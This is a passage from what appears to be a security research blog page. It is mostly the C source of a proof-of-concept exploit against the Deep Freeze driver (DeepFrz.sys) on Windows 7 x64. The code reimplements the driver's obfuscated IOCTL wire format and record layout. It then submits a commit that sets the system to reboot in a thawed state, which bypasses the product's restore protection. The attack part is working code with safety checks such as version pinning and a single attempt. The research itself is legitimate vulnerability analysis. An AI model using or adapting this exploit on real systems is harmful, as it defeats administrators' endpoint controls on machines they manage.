+#define SLOT0         0u
+
+static const BYTE expected_sha256[32] = &#123;
+    0x2E,0xDE,0x84,0x4D,0x9E,0x28,0x33,0x22,
+    0x8C,0xF0,0xEB,0x16,0x18,0x71,0x20,0xCA,
+    0x59,0x86,0x4F,0x87,0x09,0xEA,0x4F,0xA2,
+    0x40,0xFE,0xC5,0x2B,0x3A,0xB2,0x24,0xCF
+&#125;;
+
+static DWORD length(const char *s) &#123; DWORD n=0; while(s[n]) ++n; return n; &#125;
+static void say(const char *s) &#123;
+    DWORD n;
+    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE),s,length(s),&amp;n,NULL);
+&#125;
+static void hex32(DWORD v) &#123;
+    char s[11]; DWORD i;
+    s[0]='0'; s[1]='x'; s[10]=0;
+    for(i=0;i&lt;8;++i) s[9-i]=&quot;0123456789ABCDEF&quot;[(v&gt;&gt;(4*i))&amp;15u];
+    say(s);
+&#125;
+static BOOL equal_w(const WCHAR *a,const WCHAR *b) &#123;
+    while(*a &amp;&amp; *a==*b) &#123; ++a; ++b; &#125; return *a==*b;
+&#125;
+static BYTE *allocate(DWORD n) &#123;
+    return (BYTE*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,n);
+&#125;
+static void release(void *p) &#123; if(p) HeapFree(GetProcessHeap(),0,p); &#125;
+static DWORD get32(const BYTE *p) &#123;
+    return (DWORD)p[0]|((DWORD)p[1]&lt;&lt;8)|((DWORD)p[2]&lt;&lt;16)|((DWORD)p[3]&lt;&lt;24);
+&#125;
+static WORD get16(const BYTE *p) &#123; return (WORD)(p[0]|((WORD)p[1]&lt;&lt;8)); &#125;
+static void put32(BYTE *p,DWORD n) &#123;
+    p[0]=(BYTE)n; p[1]=(BYTE)(n&gt;&gt;8); p[2]=(BYTE)(n&gt;&gt;16); p[3]=(BYTE)(n&gt;&gt;24);
+&#125;
+static void put16(BYTE *p,WORD n) &#123; p[0]=(BYTE)n; p[1]=(BYTE)(n&gt;&gt;8); &#125;
+static void copy_bytes(BYTE *d,const BYTE *s,DWORD n) &#123;
+    DWORD i; for(i=0;i&lt;n;++i) d[i]=s[i];
+&#125;
+
+/* Check the on-disk driver before opening the volume. Does not prove the
+ * loaded kernel image matches a subsequently replaced on-disk file. */
+static BOOL verify_target(void) &#123;
+    OSVERSIONINFOA os=&#123;0&#125;;
+    char path[MAX_PATH];
+    const char suffix[]=&quot;\\drivers\\DeepFrz.sys&quot;;
+    HCRYPTPROV provider=0; HCRYPTHASH hash=0;
+    HANDLE file=INVALID_HANDLE_VALUE;
+    BYTE digest[32]; BYTE *chunk=NULL;
+    DWORD n,i,read_n,digest_n=32; BOOL ok=FALSE;
+    LARGE_INTEGER size;
+    if(sizeof(void*)!=8) &#123; say(&quot;This PoC requires x64.\r\n&quot;); return FALSE; &#125;
+    os.dwOSVersionInfoSize=sizeof(os);
+    if(!GetVersionExA(&amp;os) || os.dwMajorVersion!=6 || os.dwMinorVersion!=1) &#123;
+        say(&quot;Refusing: expected Windows 7 / NT 6.1.\r\n&quot;); return FALSE;
+    &#125;
+    n=GetSystemDirectoryA(path,MAX_PATH);
+    if(!n || n&gt;=MAX_PATH || (path[0]!='C' &amp;&amp; path[0]!='c') || path[1]!=':') &#123;
+        say(&quot;Refusing: expected the analyzed C: system volume.\r\n&quot;); return FALSE;
+    &#125;
+    if(n+sizeof(suffix)&gt;MAX_PATH) return FALSE;
+    for(i=0;i&lt;sizeof(suffix);++i) path[n+i]=suffix[i];
+    file=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+    if(file==INVALID_HANDLE_VALUE) goto done;
+    if(!GetFileSizeEx(file,&amp;size) || size.QuadPart!=204880) goto done;
+    if(!CryptAcquireContextA(&amp;provider,NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT)) goto done;
+    if(!CryptCreateHash(provider,CALG_SHA_256,0,0,&amp;hash)) goto done;
+    chunk=allocate(4096);
+    if(!chunk) goto done;
+    for(;;) &#123;
+        if(!ReadFile(file,chunk,4096,&amp;read_n,NULL)) goto done;
+        if(!read_n) break;
+        if(!CryptHashData(hash,chunk,read_n,0)) goto done;
+    &#125;
+    if(!CryptGetHashParam(hash,HP_HASHVAL,digest,&amp;digest_n,0) || digest_n!=32) goto done;
+    for(i=0;i&lt;32;++i) if(digest[i]!=expected_sha256[i]) goto done;
+    ok=TRUE;
+done:
+    release(chunk);
+    if(hash) CryptDestroyHash(hash);
+    if(provider) CryptReleaseContext(provider,0);
+    if(file!=INVALID_HANDLE_VALUE) CloseHandle(file);
+    if(!ok) say(&quot;Refusing: driver size/hash verification failed.\r\n&quot;);
+    return ok;
+&#125;
+
+/* Same volume-open parameters as the observed DFServ path:
+ * access=0, share=0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL. */
+static BOOL raw_call(DWORD code,BYTE *input,DWORD in_n,BYTE *output,DWORD out_n,DWORD *returned) &#123;
+    HANDLE h=CreateFileA(&quot;\\\\.\\C:&quot;,0,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+    BOOL ok; DWORD error;
+    *returned=0;
+    if(h==INVALID_HANDLE_VALUE) &#123;
+        say(&quot;CreateFile failed: &quot;); hex32(GetLastError()); say(&quot;\r\n&quot;); return FALSE;
+    &#125;
+    ok=DeviceIoControl(h,code,input,in_n,output,out_n,returned,NULL);
+    error=ok?0:GetLastError();
+    CloseHandle(h);
+    if(!ok) &#123; say(&quot;DeviceIoControl &quot;); hex32(code); say(&quot; failed: &quot;); hex32(error); say(&quot;\r\n&quot;); &#125;
+    return ok;
+&#125;
+
+/* 0x724E4: sub_140007B58 requires OutputBufferLength == 4 exactly and does not
+ * read or decode the input; it returns u32@(current_record+0xD4). Unpacked.
+ * 0x7207C: pre-dispatch sub_140007400 requires OutputBufferLength &gt;= 4 and
+ * returns !*(u8*)(*(device+104)+243). Unpacked. Both observed in DFServ v10. */
+static BOOL query_raw(DWORD code,DWORD *value) &#123;
+    BYTE out[4]=&#123;0&#125;; DWORD returned;
+    if(!raw_call(code,NULL,0,out,4,&amp;returned) || returned!=4) return FALSE;
+    *value=get32(out); return TRUE;
+&#125;
+
+/* Driver sub_1400102C0 / DFServ sub_4DC0FC: payload[i] ^= (BYTE)i ^ (BYTE)(0xBC+i),
+ * the first min(len,0x3000) bytes only. This is NOT a flat XOR 0xC0. */
+static void inner_transform(BYTE *p,DWORD n) &#123;
+    DWORD i,lim=(n&gt;0x3000u)?0x3000u:n;
+    for(i=0;i&lt;lim;++i) p[i]^=(BYTE)((BYTE)i^(BYTE)(0xBCu+i));
+&#125;
+
+/* Driver sub_14000BAC8 / sub_14000BA3C and DFServ sub_4BE564 / sub_4A8260:
+ * outer 12-byte tail is id || 0x6789EFDC || 12, then a whole-wire reverse XOR
+ * with state = (seed16 - attempt) and mask (k+3). Verified byte-for-byte. */
+static BYTE *wrap(const BYTE *plain,DWORD n,DWORD id,DWORD *wire_n) &#123;
+    FILETIME ft; ULARGE_INTEGER t;
+    ULONGLONG seconds;
+    DWORD k,total=n+OUTER_SIZE;
+    WORD state;
+    BYTE *wire=allocate(total);
+    if(!wire) return NULL;
+    copy_bytes(wire,plain,n);
+    put32(wire+n,id); put32(wire+n+4,0x6789EFDCu); put32(wire+n+8,OUTER_SIZE);
+    GetSystemTimeAsFileTime(&amp;ft);
+    t.LowPart=ft.dwLowDateTime; t.HighPart=ft.dwHighDateTime;
+    if(t.QuadPart&lt;116444736000000000ULL) &#123; release(wire); return NULL; &#125;
+    seconds=(t.QuadPart-116444736000000000ULL)/10000000ULL;
+    if(seconds&gt;0x7FFFFFFFULL) &#123; release(wire); return NULL; &#125;
+    state=(WORD)seconds;
+    for(k=0;k&lt;total;++k) &#123;
+        DWORD prod=(DWORD)(((ULONGLONG)2060591247u*(DWORD)state)&gt;&gt;32);
+        DWORD q=prod+(((DWORD)state-prod)&gt;&gt;1);
+        DWORD r=q&gt;&gt;7;
+        state=(WORD)(2u*r-137u*((DWORD)state-173u*r));
+        wire[total-1-k]^=(BYTE)((BYTE)state^(BYTE)(k+3u));
+    &#125;
+    *wire_n=total; return wire;
+&#125;
+
+/* 0x72020 (driver sub_140009C88): payload is a 4-byte index, wrapped.
+ * The I/O manager supplies SystemBuffer from max(InputBufferLength,
+ * OutputBufferLength), so the wrapped 16-byte input is what the handler
+ * unwraps. OutputBufferLength &lt; record length =&gt; the length is written back as
+ * one DWORD with Information=4; otherwise the record itself is read. */
+static BOOL meta_call(DWORD id,DWORD index,BYTE *out,DWORD out_n,DWORD *returned) &#123;
+    BYTE idx[4]; BYTE *wire; DWORD wire_n=0; BOOL ok;
+    put32(idx,index);
+    wire=wrap(idx,4,id,&amp;wire_n);
+    if(!wire) return FALSE;
+    ok=raw_call(IO_META,wire,wire_n,out,out_n,returned);
+    release(wire); return ok;
+&#125;
+
+/* 0x72024 (driver sub_14000ADE8 mode 0): the payload must be
+ * [N-byte record][146-byte trailer] with
+ *   record+0x02 = 0x1712, record+0xD4 = id,
+ *   trailer+0x00 = id, trailer+0x82 = 1, trailer+0x8A = slot, trailer+0x8E = 146,
+ * and payloadLen-146 = N. Any shorter payload is rejected by sub_140022E54 with
+ * STATUS_INVALID_PARAMETER, which is the reported 0x57.
+ *
+ * This is DFServ v10 sub_4BCE74's a6 != 1 branch: OutputBuffer=NULL and
+ * OutputBufferLength=0, success judged by Information == N. Nothing is copied
+ * back to a user output buffer in that form, so this is a pre-flight check on
+ * the request format, not the record read (the record comes from 0x72020). */
+static BOOL verify_read_call(DWORD id,DWORD n,DWORD slot) &#123;
+    DWORD payload_n=n+TAIL_SIZE, wire_n=0, returned=0;
+    BYTE *payload=allocate(payload_n), *wire;
+    BOOL ok;
+    if(!payload) return FALSE;
+    put16(payload+0x02,0x1712);
+    put32(payload+0xD4,id);
+    put32(payload+n+0x00,id);
+    put32(payload+n+0x82,1);
+    put32(payload+n+0x8A,slot);
+    put32(payload+n+0x8E,TAIL_SIZE);
+    inner_transform(payload,payload_n);
+    wire=wrap(payload,payload_n,id,&amp;wire_n);
+    release(payload);
+    if(!wire) return FALSE;
+    ok=raw_call(IO_READ,wire,wire_n,NULL,0,&amp;returned);
+    release(wire);
+    if(!ok) return FALSE;
+    if(returned!=n) &#123; say(&quot;Unexpected 0x72024 completion length.\r\n&quot;); return FALSE; &#125;
+    return TRUE;
+&#125;
+
+static DWORD thaw_once(void) &#123;
+    DWORD id=0,key=0,n=0,returned=0,wire_n=0,payload_n=0;
+    BYTE size_bytes[4]=&#123;0&#125;;
+    BYTE *record=NULL,*payload=NULL,*wire=NULL;
+    DWORD result=1;
+
+    if(!verify_target()) return 1;
+    if(!query_raw(IO_RECORD_ID,&amp;id) || !query_raw(IO_TYPE1,&amp;key)) return 1;
+    say(&quot;record id from 0x724E4: &quot;); hex32(id);
+    say(&quot;  type1 from 0x7207C: &quot;); hex32(key); say(&quot;\r\n&quot;);
+
+    /* v10 length query is 0x72020, NOT 0x72024. */
+    if(!meta_call(id,0,size_bytes,4,&amp;returned)) return 1;
+    if(returned!=4) &#123; say(&quot;Unexpected length-query completion size.\r\n&quot;); return 1; &#125;
+    n=get32(size_bytes);
+    if(n&lt;MIN_RECORD || n&gt;MAX_RECORD) &#123;
+        say(&quot;Refusing unexpected record length: &quot;); hex32(n); say(&quot;\r\n&quot;); return 1;
+    &#125;
+    say(&quot;record length from 0x72020: &quot;); hex32(n); say(&quot;\r\n&quot;);
+
+    /* Same handler, OutputBufferLength &gt;= n =&gt; the record itself is returned. */
+    record=allocate(n);
+    if(!record) return 1;
+    if(!meta_call(id,0,record,n,&amp;returned) || returned!=n) &#123;
+        say(&quot;Refusing: record read did not return n bytes.\r\n&quot;); goto done;
+    &#125;
+    if(get16(record+2)!=0x1712 || get32(record+0xD4)!=id) &#123;
+        say(&quot;Refusing: inconsistent record header/id.\r\n&quot;); goto done;
+    &#125;
+
+    /* Optional pre-flight: the corrected 0x72024 request form. Until v11 the
+     * candidate sent a bare 4-byte payload here, which the driver always
+     * rejected with 0x57. */
+    if(!verify_read_call(id,n,SLOT0)) &#123;
+        say(&quot;Corrected 0x72024 request was not accepted; aborting before the write.\r\n&quot;);
+        goto done;
+    &#125;
+    say(&quot;Corrected 0x72024 request accepted.\r\n&quot;);
+
+    /* Build the 0x72094 commit exactly as DFServ v10 sub_4BCE74 does:
+     * payload = record(N) || 146-byte trailer, inner transform, outer wrap.
+     * The driver clones the current record and adopts only +0x04 and +0x72. */
+    payload_n=n+TAIL_SIZE;
+    payload=allocate(payload_n);
+    if(!payload) goto done;
+    copy_bytes(payload,record,n);
+    put32(payload+0x04,1);            /* one thawed initialization interval */
+    put16(payload+0x72,7);            /* DFServ RebootThawed operation        */
+    put32(payload+n+0x00,id);
+    put32(payload+n+0x82,1);
+    put32(payload+n+0x8A,SLOT0);
+    put32(payload+n+0x8E,TAIL_SIZE);
+    inner_transform(payload,payload_n);
+    wire=wrap(payload,payload_n,id,&amp;wire_n);
+    if(!wire) goto done;
+    say(&quot;Submitting ONE 0x72094 request (count=1, operation=7).\r\n&quot;);
+    if(!raw_call(IO_COMMIT,wire,wire_n,NULL,0,&amp;returned)) &#123;
+        say(&quot;Write outcome is not confirmed; do not assume nothing changed. No retry was made.\r\n&quot;);
+        goto done;
+    &#125;
+    if(returned!=n) &#123;
+        say(&quot;Unexpected completion length; write may have occurred. No retry was made.\r\n&quot;);
+        goto done;
+    &#125;
+    say(&quot;Driver reported success. No reboot was requested. Actual thaw state is not verified.\r\n&quot;);
+    result=0;
+done:
+    release(wire); release(payload); release(record);
+    return result;
+&#125;
+
+/* Custom PE entry point keeps the executable independent of UCRT/.NET. */
+void entry(void) &#123;
+    int argc=0; DWORD result=2;
+    WCHAR **argv=CommandLineToArgvW(GetCommandLineW(),&amp;argc);
+    if(argv &amp;&amp; argc==2 &amp;&amp; equal_w(argv[1],L&quot;--thaw-once&quot;)) result=thaw_once();
+    else say(&quot;Version-pinned static-analysis PoC (v11).\r\nUsage: thaw_once_v11_candidate.exe --thaw-once\r\nNo device calls made without that argument. No automatic reboot.\r\n&quot;);
+    if(argv) LocalFree(argv);
+    ExitProcess(result);
+&#125;
+</code></pre>
+
+</div>
+
+
+  </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    if (window.hljs) {
+      hljs.highlightAll();
+    }
+
+    var a = document.getElementById('mirror-switch');
+    if (!a) return;
+
+    var mainHost = 'blog.junyu33.me';
+    var cnHost = 'blog-cn.junyu33.me';
+    var path = window.location.pathname + window.location.search + window.location.hash;
+    var lang = a.getAttribute('data-lang') || 'zh';
+
+    if (window.location.hostname === cnHost) {
+      a.href = 'https://' + mainHost + path;
+      a.textContent = lang === 'en' ? 'Main Site' : '主站';
+    } else {
+      a.href = 'https://' + cnHost + path;
+      a.textContent = lang === 'en' ? 'CN Mirror' : '国内镜像';
+    }
+  });
+  </script>
+</body>
+</html>
